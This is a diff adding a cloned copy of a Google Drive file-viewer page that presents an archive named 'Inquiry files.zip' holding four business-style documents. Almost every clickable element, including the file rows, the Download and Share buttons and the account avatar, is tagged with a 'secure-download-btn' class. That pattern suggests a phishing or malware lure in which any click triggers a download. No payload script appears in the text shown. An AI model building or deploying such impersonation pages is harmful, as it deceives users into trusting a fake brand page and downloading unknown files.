+    .gb_Mc .gb_jd.gb_kd button:focus svg,
+    .gb_Mc .gb_jd.gb_kd button:focus:hover svg,
+    .gb_jd button:focus svg,
+    .gb_jd button:focus:hover svg,
+    .gb_B:focus,
+    .gb_B:focus:hover {
+        background-color: rgba(60, 64, 67, .1)
+    }
+    
+    .gb_Mc .gb_jd.gb_kd button:active svg,
+    .gb_jd button:active svg,
+    .gb_B:active {
+        background-color: rgba(60, 64, 67, .12)
+    }
+    
+    .gb_Mc .gb_jd.gb_kd button:hover svg,
+    .gb_jd button:hover svg,
+    .gb_B:hover {
+        background-color: rgba(60, 64, 67, .08)
+    }
+    
+    .gb_Mc .gb_jd button:hover svg,
+    .gb_Mc .gb_B:hover {
+        background-color: rgba(232, 234, 237, .08)
+    }
+    
+    .gb_Mc .gb_jd button:focus svg,
+    .gb_Mc .gb_jd button:focus:hover svg,
+    .gb_Mc .gb_B:focus,
+    .gb_Mc .gb_B:focus:hover {
+        background-color: rgba(232, 234, 237, .1)
+    }
+    
+    .gb_Mc .gb_jd button:active svg,
+    .gb_Mc .gb_B:active {
+        background-color: rgba(232, 234, 237, .12)
+    }
+    
+    .gb_dd {
+        padding: 4px
+    }
+    
+    @media (max-width:350px) {}
+    
+    @media screen and (max-width:319px) {}
+    
+    .gb_Fa {
+        position: relative;
+        -webkit-transition: box-shadow 250ms;
+        transition: box-shadow 250ms
+    }
+    
+    .gb_Fa svg {
+        fill: currentColor
+    }
+    
+    .gb_yd {
+        vertical-align: middle;
+        white-space: nowrap;
+        -webkit-box-align: center;
+        -webkit-align-items: center;
+        align-items: center;
+        display: -webkit-box;
+        display: -webkit-flex;
+        -webkit-user-select: none
+    }
+    
+    .gb_4c {
+        display: inline
+    }
+    
+    .gb_Dd {
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        line-height: normal;
+        -webkit-flex: 0 0 auto;
+        -webkit-box-flex: 0;
+        flex: 0 0 auto;
+        -webkit-box-pack: flex-end;
+        -webkit-justify-content: flex-end;
+        justify-content: flex-end
+    }
+    
+    .gb_Kd {
+        height: 48px
+    }
+    
+    .gb_Fa.gb_Kd {
+        min-width: auto
+    }
+    
+    .gb_Kd .gb_Dd {
+        float: right;
+        padding-left: 32px
+    }
+    
+    .gb_Mc {
+        color: white
+    }
+    
+    .gb_Fa a {
+        color: inherit
+    }
+    
+    .gb_Fa svg {
+        opacity: 1
+    }
+    
+    .gb_Mc svg {
+        color: rgba(255, 255, 255, .87)
+    }
+    
+    @media screen and (max-width:319px) {
+
+    }
+            
+ 
+    .gb_P {
+        -webkit-background-size: 32px 32px;
+        background-size: 32px 32px;
+        border: 0;
+        -webkit-border-radius: 50%;
+        border-radius: 50%;
+        display: block;
+        margin: 0px;
+        position: relative;
+        height: 32px;
+        width: 32px;
+        z-index: 0
+    }
+    
+    @media (-webkit-min-device-pixel-ratio:1.25),
+    (min-resolution:1.25dppx),
+    (min-device-pixel-ratio:1.25) {
+        .gb_P::before,
+        .gb_gb::before {
+            display: inline-block;
+            -webkit-transform: scale(0.5);
+            -webkit-transform: scale(0.5);
+            transform: scale(0.5);
+            -webkit-transform-origin: left 0;
+            -webkit-transform-origin: left 0;
+            transform-origin: left 0
+        }
+    }
+    
+    .gb_P:hover,
+    .gb_P:focus {
+        -webkit-box-shadow: 0 1px 0 rgba(0, 0, 0, .15);
+        box-shadow: 0 1px 0 rgba(0, 0, 0, .15)
+    }
+    
+    .gb_P:active {
+        -webkit-box-shadow: inset 0 2px 0 rgba(0, 0, 0, .15);
+        box-shadow: inset 0 2px 0 rgba(0, 0, 0, .15)
+    }
+    
+    .gb_P:active::after {
+        background: rgba(0, 0, 0, .1);
+        -webkit-border-radius: 50%;
+        border-radius: 50%;
+        content: "";
+        display: block;
+        height: 100%
+    }
+    
+    .gb_z.gb_0,
+    .gb_jb.gb_0,
+    .gb_Za.gb_0 {
+        -webkit-flex: 0 1 auto;
+        -webkit-box-flex: 0;
+        flex: 0 1 auto
+    }
+    
+    .gb_3d {
+        height: 40px;
+        position: absolute;
+        width: 40px
+    }
+    
+    .gb_4d .gb_3d {
+        right: 0;
+        top: 0
+    }
+    
+    .gb_z .gb_B {
+        padding: 4px
+    }
+    </style>
+            <style>
+    @media (max-width: 768px) {
+  .VIpgJd-TzA9Ye-eEGnhe{
+    display: none; /* This property hides the elements */
+  }
+  .ndfHFb-c4YZDc-Wrql6b-DdWCyb-b0t70b {
+    display: none; /* This property hides the elements */
+  }
+            .ndfHFb-file {
+              font-size:10px;
+            }
+}
+   
+    </style>
+    <link type=text/css href=stylesheet_0.css rel=stylesheet nonce>
+    
+    <iframe tabindex=-1 style=position:absolute;width:9em;height:9em;top:-99em aria-hidden=true src=frames/0/index.html></iframe>
+    <div style=display:none aria-hidden=true></div>
+    <div ng-non-bindable aria-hidden=true></div>
+    <div class=gb_Ac ng-non-bindable aria-hidden=true style=visibility:hidden;left:1158px;top:52px;display:none></div>
+    <div id=sharing-aria-speakable class=EDlbXc-RTRLOc-OUyo8b aria-live=assertive role=region aria-atomic=true></div>
+    <iframe style=display:none aria-hidden=true></iframe>
+    <div class=YM5U3 jscontroller=GpztQ jsaction=rcuQ6b:npT2md;M3WHIb:y6SJ1d;qhShn:Vtdxob;u3ErQ:ybzaBc;NsPRle:vGvlO;n0bmuf:kXQx1;eaIRqb:KJfGrc;a6J6Fe:.CLIENT jsmodel=t1DRgd aria-hidden=true>
+        <div jsname=JOC2Se>
+            <div class="ndfHFb-c4YZDc ndfHFb-c4YZDc-AHmuwe-Hr88gd-OWB6Me dif24c vhoiae LgGVmb bvmRsc ndfHFb-c4YZDc-vyDMJf-aZ2wEe ndfHFb-c4YZDc-i5oIFb ndfHFb-c4YZDc-uoC0bf ndfHFb-c4YZDc-lZ2Ukb ndfHFb-c4YZDc-TSZdd" aria-label="Showing viewer." tabindex=0>
+                <div class="ndfHFb-c4YZDc-bnBfGc ndfHFb-c4YZDc-zTETae" tabindex=0 aria-label="Displaying Inquiry files.zip."></div>
+                <div class=ndfHFb-c4YZDc-JNEHMb>
+                    <div class="ndfHFb-c4YZDc-MqcBrc-ORHb-haAclf sf-hidden" tabindex=0 role=complementary></div>
+                    <div class="ndfHFb-c4YZDc-uWtm3-ORHb sf-hidden" role=status tabindex=0></div>
+                    <div class="ndfHFb-c4YZDc-dZssN-FVVVue-ORHb-haAclf sf-hidden"></div>
+                    <div class="ndfHFb-c4YZDc-SjW3R-ORHb-haAclf sf-hidden" tabindex=0 role=complementary></div>
+                    <div class="ndfHFb-c4YZDc-L7w45e-ORHb sf-hidden" role=status tabindex=0></div>
+                    <div class="ndfHFb-c4YZDc-oKM7Re-L7w45e-ORHb sf-hidden" role=status tabindex=0></div>
+                </div>
+                <div class=ndfHFb-c4YZDc-K9a4Re style=bottom:0px>
+                    <div class="ndfHFb-c4YZDc-E7ORLb-LgbsSe ndfHFb-c4YZDc-LgbsSe-OWB6Me ndfHFb-c4YZDc-LgbsSe" role=button aria-disabled=true data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=r,c data-tooltip-offset=-6 style=user-select:none;left:16px;display:none;opacity:1></div>
+                    <div class="ndfHFb-c4YZDc-tJiF1e-LgbsSe ndfHFb-c4YZDc-LgbsSe-OWB6Me ndfHFb-c4YZDc-LgbsSe" role=button aria-disabled=true data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=l,c data-tooltip-offset=-6 style=user-select:none;right:16px;display:none;opacity:1></div>
+                    <div class=ndfHFb-c4YZDc-q77wGc style=opacity:1>
+                        <div class=ndfHFb-c4YZDc-DARUcf-NnAfwf-i5oIFb style=display:none></div>
+                        <div class=ndfHFb-c4YZDc-nJjxad-nK2kYb-i5oIFb style=display:none></div>
+                        <div class=ndfHFb-c4YZDc-giiMnc-b0t70b style=display:none></div>
+                        <div class=ndfHFb-c4YZDc-LzGo7c style=display:none></div>
+                    </div>
+                    <div class="ndfHFb-c4YZDc-K9a4Re-nKQ6qf ndfHFb-c4YZDc-TvD9Pc-qnnXGd" role=main>
+                        <div class="ndfHFb-c4YZDc-EglORb-ge6pde ndfHFb-c4YZDc-K9a4Re-ge6pde-Ne3sFf" role=status tabindex=-1 aria-label=Loading style=display:none></div>
+                        <div style=display:none id=drive-active-item-info>{"id": "1TnR3vdDIUqU00lm1n_9RG7rTG6zVedbn", "title": "Inquiry files.zip", "mimeType": "application\/x-zip-compressed"}</div>
+                        <div class="ndfHFb-c4YZDc-oKVyEf ndfHFb-c4YZDc-TvD9Pc-qnnXGd ndfHFb-c4YZDc-neVct-RCfa3e">
+                            <div class=ndfHFb-c4YZDc-oKVyEf-haAclf>
+                                <div class="ndfHFb-c4YZDc-s2gQvd ndfHFb-c4YZDc-oKVyEf-s2gQvd">
+                                    <div class=ndfHFb-c4YZDc-TvD9Pc-qnnXGd>
+                                        <div class=ndfHFb-c4YZDc-wvGCSb-gkA7Yd style=left:1032.5px;top:64px;text-align:left dir=ltr>
+                                            <div class="wvGCSb wvGCSb-gkA7Yd-nUpftc ocLVN-di8rgd-O1htCb-aGxpHf-di8rgd-nupQLb wvGCSb-RDNXzf-P7Vtfd wvGCSb-gkA7Yd-nUpftc-NBtyUd HB1eCd-UMrnmb HB1eCd-MqDS2b-uoC0bf wvGCSb-neVct-uNfmef wvGCSb-neVct-BvBYQ" id=wvGCSb-gkA7Yd-nUpftc role=list></div>
+                                            <div class=wvGCSb-AznF2e-DTMEae></div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class=ndfHFb-c4YZDc-JqEhuc style=width:80%;height:80%;left:8%;top:80px>
+                                    <div class=ndfHFb-c4YZDc-JqEhuc-tJHJj>
+                                        <div class=ndfHFb-c4YZDc-JqEhuc-jIkMge-oKdM2c>
+                                            <div class="secure-download-btn ndfHFb-c4YZDc-JqEhuc-r4nke" data-tooltip="Inquiry files.zip" aria-label="Inquiry files.zip" data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=b,c data-tooltip-offset=-6 data-tooltip-only-on-overflow=true>Inquiry files.zip</div>
+                                            <div class=ndfHFb-c4YZDc-JqEhuc-NnAfwf>4 items</div>
+                                        </div>
+                                        <div class=ndfHFb-c4YZDc-JqEhuc-r4nke-tJHJj>
+                                            <div class=ndfHFb-c4YZDc-JqEhuc-r4nke-oKdM2c>
+                                                <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-jIkMge-oKdM2c-Bz112c"></div>
+                                                <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-jIkMge-oKdM2c-V1ur5d" tabindex=-1>Name</div>
+                                                <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-oKdM2c-TzVJe-ihIZgd">Last modified</div>
+                                                <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-oKdM2c-SxQuSe">File size</div>
+                                            </div>
+                                        </div>
+                                        <div class="ndfHFb-c4YZDc-JqEhuc-a4fUwd-Bz112c ndfHFb-c4YZDc-Bz112c ndfHFb-c4YZDc-LgbsSe" role=button data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=b,c data-tooltip-offset=-6 aria-hidden=true style=user-select:none;display:none></div>
+                                        <div class=ndfHFb-c4YZDc-JqEhuc-n5VRYe style=opacity:0;top:90px></div>
+                                    </div>
+                                    <div class="ndfHFb-c4YZDc-JqEhuc-bN97Pc ndfHFb-c4YZDc-JqEhuc-s2gQvd ndfHFb-c4YZDc-s2gQvd ndfHFb-c4YZDc-s2gQvd-to915 ndfHFb-c4YZDc-AHmuwe-wcotoc-zTETae ndfHFb-c4YZDc-S2QgGf-haAclf" aria-label="Archived content list " role=listbox tabindex=0 style=user-select:none;margin-right:20px;left:0px;top:90px>
+                                        <div class="secure-download-btn ndfHFb-c4YZDc-JqEhuc-jIkMge-oKdM2c ndfHFb-c4YZDc-bMcfAe" tabindex=-1 role=option style=user-select:none data-tooltip=client-details.pdf aria-label="client-details.pdf File" data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=b,c data-tooltip-offset=-6 data-tooltip-only-on-overflow=true id=:2t>
+                                            <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-jIkMge-oKdM2c-Bz112c" style="background-image:url(images/10.png);background-position:left top;background-repeat:no-repeat"></div>
+                                            <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-jIkMge-oKdM2c-V1ur5d" tabindex=-1>client-details.pdf</div>
+                                            <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-oKdM2c-TzVJe-ihIZgd">-</div>
+                                            <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-oKdM2c-SxQuSe">5 KB</div>
+                                        </div>
+                                        <div class="secure-download-btn ndfHFb-c4YZDc-JqEhuc-jIkMge-oKdM2c ndfHFb-c4YZDc-bMcfAe" tabindex=-1 role=option data-tooltip=contactlist.docx aria-label="contactlist.docx File" data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=b,c data-tooltip-offset=-6 data-tooltip-only-on-overflow=true id=:2u style=user-select:none>
+                                            <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-jIkMge-oKdM2c-Bz112c" style="background-image:url(images/11.png);background-position:left top;background-repeat:no-repeat"></div>
+                                            <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-jIkMge-oKdM2c-V1ur5d" tabindex=-1>contactlist.docx</div>
+                                            <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-oKdM2c-TzVJe-ihIZgd">-</div>
+                                            <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-oKdM2c-SxQuSe">3 KB</div>
+                                        </div>
+                                        <div class="secure-download-btn ndfHFb-c4YZDc-JqEhuc-jIkMge-oKdM2c ndfHFb-c4YZDc-bMcfAe" tabindex=-1 role=option data-tooltip=Priority-list-(important).xlsx aria-label="Priority-list-(important).xlsx File" data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=b,c data-tooltip-offset=-6 data-tooltip-only-on-overflow=true id=:2v style=user-select:none>
+                                            <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-jIkMge-oKdM2c-Bz112c" style="background-image:url(images/12.png);background-position:left top;background-repeat:no-repeat"></div>
+                                            <div class=" secure-download-btn ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-jIkMge-oKdM2c-V1ur5d" tabindex=-1>Priority-list-(important).xlsx</div>
+                                            <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-oKdM2c-TzVJe-ihIZgd">-</div>
+                                            <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-oKdM2c-SxQuSe">6 KB</div>
+                                        </div>
+                                        <div class="secure-download-btn ndfHFb-c4YZDc-JqEhuc-jIkMge-oKdM2c ndfHFb-c4YZDc-bMcfAe" tabindex=-1 role=option data-tooltip=products-list.pdf aria-label="products-list.pdf File" data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=b,c data-tooltip-offset=-6 data-tooltip-only-on-overflow=true id=:2w style=user-select:none>
+                                            <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-jIkMge-oKdM2c-Bz112c" style="background-image:url(images/10.png);background-position:left top;background-repeat:no-repeat"></div>
+                                            <div class="secure-download-btn ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-jIkMge-oKdM2c-V1ur5d" tabindex=-1>products-list.pdf</div>
+                                            <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-oKdM2c-TzVJe-ihIZgd">-</div>
+                                            <div class="ndfHFb-c4YZDc-JqEhuc-oKdM2c-dJDgTb ndfHFb-c4YZDc-JqEhuc-oKdM2c-SxQuSe">2 KB</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class=ndfHFb-c4YZDc-Wrql6b role=toolbar style=opacity:1>
+                    <div class=ndfHFb-c4YZDc-Wrql6b-SmKAyb style=margin-right:12px;padding-left:12px>
+                        <div class=ndfHFb-c4YZDc-Wrql6b-hOcTPc style=left:12px>
+                            <div class=ndfHFb-c4YZDc-Wrql6b-Bz112c tabindex=-1 role=img aria-label="Compressed archive icon" style="background-image:url(images/13.png);background-position:left top;background-repeat:no-repeat"></div>
+                            <div class=ndfHFb-c4YZDc-Wrql6b-jfdpUb tabindex=-1>
+                                <div class=" ndfHFb-c4YZDc-Wrql6b-V1ur5d ndfHFb-c4YZDc-Iqlsrf-qnnXGd ndfHFb-file" style="
+    font-size: 12px;
+" data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class="ndfHFb-c4YZDc-tk3N6e-suEOdc ndfHFb-file " data-tooltip-align=b,c data-tooltip-offset=-6>Inquiry files.zip</div>
+                                <div class="ndfHFb-file ndfHFb-c4YZDc-Wrql6b-V1ur5d ndfHFb-c4YZDc-Wrql6b-V1ur5d-hpYHOb">Inquiry files.zip</div>
+                                
+                            </div>
+                            <div class=ndfHFb-c4YZDc-Ujd07d-Btuy5e-Bz112c style=display:none></div>
+                            <div class=ndfHFb-c4YZDc-Wrql6b-zM6fo-GMvhG-b0t70b style=display:none></div>
+                            <div class=ndfHFb-c4YZDc-TL3Ynd-V67aGc-haAclf></div>
+                            <div class=ndfHFb-c4YZDc-Wrql6b-C7uZwb-b0t70b>
+                                <div class="ndfHFb-c4YZDc-to915-LgbsSe ndfHFb-c4YZDc-C7uZwb-LgbsSe VIpgJd-TzA9Ye-eEGnhe ndfHFb-c4YZDc-LgbsSe ndfHFb-c4YZDc-C7uZwb-ibnC6b-Btuy5e ndfHFb-c4YZDc-LgbsSe-OWB6Me" role=button data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=b,c data-tooltip-offset=-6 aria-disabled=true aria-hidden=true aria-label=Locked data-tooltip=Locked style=user-select:none;display:none></div>
+                            </div>
+                        </div>
+                        <div class=ndfHFb-c4YZDc-Wrql6b-DdWCyb-b0t70b>
+                            <div class=ndfHFb-c4YZDc-Wrql6b-FNFY6c-J42Xof-qMHh7d>
+                                <div class="ndfHFb-c4YZDc-Wrql6b-FNFY6c ndfHFb-c4YZDc-to915-LgbsSe VIpgJd-TzA9Ye-eEGnhe ndfHFb-c4YZDc-LgbsSe ndfHFb-c4YZDc-Wrql6b-FNFY6c-BP2Omd-qMHh7d" role=button data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=b,c data-tooltip-offset=-6 aria-hidden=false style=user-select:none tabindex=0>
+                                    <div class=ndfHFb-c4YZDc-FNFY6c-DWWcKd-Bz112c style="background-image:url(images/14.png);background-position:left top;background-repeat:no-repeat"></div>
+                                    <div class=ndfHFb-c4YZDc-FNFY6c-V67aGc data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=b,c data-tooltip-offset=-6>Open with ZIP Extractor</div>
+                                    <div class="ndfHFb-c4YZDc-FNFY6c-V67aGc ndfHFb-c4YZDc-FNFY6c-V67aGc-hpYHOb sf-hidden">Open with ZIP Extractor</div>
+                                </div>
+                                <div class="ndfHFb-c4YZDc-Wrql6b-qMHh7d ndfHFb-c4YZDc-to915-LgbsSe VIpgJd-TzA9Ye-eEGnhe ndfHFb-c4YZDc-LgbsSe ndfHFb-c4YZDc-Wrql6b-qMHh7d-yolsp" role=button aria-expanded=false aria-haspopup=true data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=b,c data-tooltip-offset=-6 aria-label="Open with" data-tooltip="Open with" style=user-select:none aria-hidden=false tabindex=0>
+                                    <div class=ndfHFb-c4YZDc-Wrql6b-FNFY6c-hgDUwe></div>
+                                    <div class=ndfHFb-c4YZDc-Wrql6b-qMHh7d-SmKAyb>
+                                        <div class="ndfHFb-c4YZDc-Wrql6b-qMHh7d-fmcmS sf-hidden" tabindex=-1>Open with</div>
+                                        <div class=ndfHFb-c4YZDc-Wrql6b-xl07Ob-LgbsSe-hFsbo>
+                                            <div class=ndfHFb-c4YZDc-Bz112c></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class=ndfHFb-c4YZDc-Wrql6b-C7uZwb-b0t70b></div>
+                        </div>
+                        <div class="ndfHFb-c4YZDc-Wrql6b-AeOLfc-b0t70b ndfHFb-c4YZDc-Wrql6b-AeOLfc-b0t70b-SfQLQb-Woal0c-jcJzye-n1UuX">
+                            <div class="ndfHFb-c4YZDc-GSQQnc-LgbsSe ndfHFb-c4YZDc-to915-LgbsSe" aria-label="Pop out" style=display:none></div>
+                            <div class=ndfHFb-c4YZDc-Wrql6b-LQLjdd>
+                                <div class="ndfHFb-c4YZDc-to915-LgbsSe ndfHFb-c4YZDc-Wrql6b-htvI8d-wcotoc-ndfHFb VIpgJd-TzA9Ye-eEGnhe ndfHFb-c4YZDc-LgbsSe" role=button data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=b,c data-tooltip-offset=-6 aria-hidden=true style=user-select:none;display:none aria-label=Organize data-tooltip=Organize></div>
+                                <div class=ndfHFb-c4YZDc-Wrql6b-C7uZwb-b0t70b>
+                                    <div class="ndfHFb-c4YZDc-to915-LgbsSe ndfHFb-c4YZDc-C7uZwb-LgbsSe VIpgJd-TzA9Ye-eEGnhe ndfHFb-c4YZDc-LgbsSe ndfHFb-c4YZDc-C7uZwb-LgbsSe-SfQLQb-Bz112c" role=button data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=b,c data-tooltip-offset=-6 aria-disabled=false aria-hidden=false style=user-select:none aria-label="Add a comment" data-tooltip="Add a comment" tabindex=0>
+                                        <div class="secure-download-btn ndfHFb-c4YZDc-C7uZwb-LgbsSe-Bz112c ndfHFb-c4YZDc-Bz112c ndfHFb-c4YZDc-htvI8d-jNm5if-Bz112c">
+                                            <div class="ndfHFb-aZ2wEe sf-hidden" dir=ltr></div>
+                                        </div>
+                                    </div>
+                                    <div class="ndfHFb-c4YZDc-to915-LgbsSe ndfHFb-c4YZDc-C7uZwb-LgbsSe VIpgJd-TzA9Ye-eEGnhe ndfHFb-c4YZDc-LgbsSe ndfHFb-c4YZDc-C7uZwb-LgbsSe-SfQLQb-Bz112c ndfHFb-c4YZDc-LgbsSe-OWB6Me" role=button data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=b,c data-tooltip-offset=-6 aria-disabled=true aria-hidden=true aria-label=Print data-tooltip=Print style=user-select:none;display:none></div>
+                                    <div class="ndfHFb-c4YZDc-to915-LgbsSe ndfHFb-c4YZDc-C7uZwb-LgbsSe VIpgJd-TzA9Ye-eEGnhe ndfHFb-c4YZDc-LgbsSe ndfHFb-c4YZDc-C7uZwb-LgbsSe-SfQLQb-Bz112c" role=button data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=b,c data-tooltip-offset=-6 aria-disabled=false aria-hidden=false aria-label=Download data-tooltip=Download style=user-select:none tabindex=0>
+                                        <div class="secure-download-btn ndfHFb-c4YZDc-Bz112c ndfHFb-c4YZDc-C7uZwb-LgbsSe-Bz112c ndfHFb-c4YZDc-nupQLb-Bz112c">
+                                            <div class="ndfHFb-aZ2wEe sf-hidden" dir=ltr></div>
+                                        </div>
+                                    </div>
+                                    <div class="ndfHFb-c4YZDc-z5C9Gb-LgbsSe ndfHFb-c4YZDc-to915-LgbsSe VIpgJd-TzA9Ye-eEGnhe ndfHFb-c4YZDc-LgbsSe" role=button aria-expanded=false aria-haspopup=true data-tooltip-unhoverable=true data-tooltip-delay=500 data-tooltip-class=ndfHFb-c4YZDc-tk3N6e-suEOdc data-tooltip-align=b,c data-tooltip-offset=-6 aria-label="More actions" data-tooltip="More actions" style=user-select:none aria-hidden=false tabindex=0>
+                                        <div class= secure-download-btn ndfHFb-c4YZDc-Bz112c></div>
+                                    </div>
+                                    
+                                    <div class="secure-download-btn ndfHFb-c4YZDc-to915-LgbsSe ndfHFb-c4YZDc-LgbsSe ndfHFb-c4YZDc-euCgFf-CJXtmf-LgbsSe"><span displayname=dlp-detector id=viewer-share-client-button class="zAYgkb-uoC0bf zAYgkb-haAclf"><div role=button class=" secure-download-btn VIpgJd-TzA9Ye-eEGnhe tk3N6e-LgbsSe tk3N6e-LgbsSe-JIbuQc zAYgkb-DIdRlc-LgbsSe undefined" aria-disabled=false aria-label=Share tabindex=0 style=user-select:none>Share</div><div id=scb-quick-actions-menu-button class="zAYgkb-mAKE4e-LQLjdd-xl07Ob-LgbsSe VIpgJd-Kb3HCc-xl07Ob-LgbsSe VIpgJd-Kb3HCc-xl07Ob-LgbsSe-vhaaFf-LK5yu VIpgJd-TzA9Ye-eEGnhe" role=button aria-label="Quick sharing actions" aria-disabled=false aria-expanded=false aria-haspopup=true style=user-select:none tabindex=0><div class="VIpgJd-Kb3HCc-xl07Ob-LgbsSe-cHYyed VIpgJd-TzA9Ye-eEGnhe"></div><div class="VIpgJd-Kb3HCc-xl07Ob-LgbsSe-j4gsHd VIpgJd-TzA9Ye-eEGnhe"></div></div></span></div>
+                                </div>
+                            </div>
+                            <div id=one-google-bar class="ndfHFb-c4YZDc-Woal0c-jcJzye-ZMv3u ndfHFb-c4YZDc-n1UuX-Bz112c">
+                                <div class="gb_Fa gb_Kd gb_4d gb_H gb_Mc gb_Xc" id=gb style=background-color:transparent>
+                                    <div class="gb_Dd gb_1d gb_yd" ng-non-bindable data-ogsr-up style=padding:0;height:auto;display:block>
+                                        <div class=gb_Te style=display:block>
+                                            <div class=gb_4c></div>
+                                            <div class="gb_z gb_dd gb_Pf gb_0">
+                                                <div class="gb_D gb_jb gb_Pf gb_0">
+                                                    <a class="secure-download-btn gb_B gb_Za gb_0" aria-expanded=false aria-label="Google Account:   
+()" href="https://accounts.google.com/SignOutOptions?hl=en&amp;continue=view%3Fusp%3Ddrive_open&amp;service=writely&amp;ec=GBRAGQ" tabindex=0 role=button>
+                                                        <div class=gb_3d>
+                                                            <svg focusable=false height=40px version=1.1 viewBox="0 0 40 40" width=40px xml:space=preserve xmlns=http://www.w3.org/2000/svg xmlns:xlink=http://www.w3.org/1999/xlink style=opacity:1.0>
+                                                                <path d=M4.02,28.27C2.73,25.8,2,22.98,2,20c0-2.87,0.68-5.59,1.88-8l-1.72-1.04C0.78,13.67,0,16.75,0,20c0,3.31,0.8,6.43,2.23,9.18L4.02,28.27z fill=#F6AD01></path>
+                                                                <path d=M32.15,33.27C28.95,36.21,24.68,38,20,38c-6.95,0-12.98-3.95-15.99-9.73l-1.79,0.91C5.55,35.61,12.26,40,20,40c5.2,0,9.93-1.98,13.48-5.23L32.15,33.27z fill=#249A41></path>
+                                                                <path d=M33.49,34.77C37.49,31.12,40,25.85,40,20c0-5.86-2.52-11.13-6.54-14.79l-1.37,1.46C35.72,9.97,38,14.72,38,20c0,5.25-2.26,9.98-5.85,13.27L33.49,34.77z fill=#3174F1></path>
+                                                                <path d=M20,2c4.65,0,8.89,1.77,12.09,4.67l1.37-1.46C29.91,1.97,25.19,0,20,0l0,0C12.21,0,5.46,4.46,2.16,10.96L3.88,12C6.83,6.08,12.95,2,20,2 fill=#E92D18></path>
+                                                            </svg>
+                                                        </div><span class=gb_Ud><img class="gb_P gbii" src=images/16.jpg srcset alt aria-hidden=true data-noaft sizes></span>
+                                                        <div class="gb_Q gb_R sf-hidden" aria-hidden=true>
+                                                            <svg class=gb_Ka height=14 viewBox="0 0 14 14" width=14 xmlns=http://www.w3.org/2000/svg>
+                                                                <circle class=gb_La cx=7 cy=7 r=7></circle>
+                                                                <path class=gb_Na d="M6 10H8V12H6V10ZM6 2H8V8H6V2Z"></path>
+                                                            </svg>
+                                                        </div>
+                                                    </a>
+                                                </div>
+                                            </div>
+                                        </div>
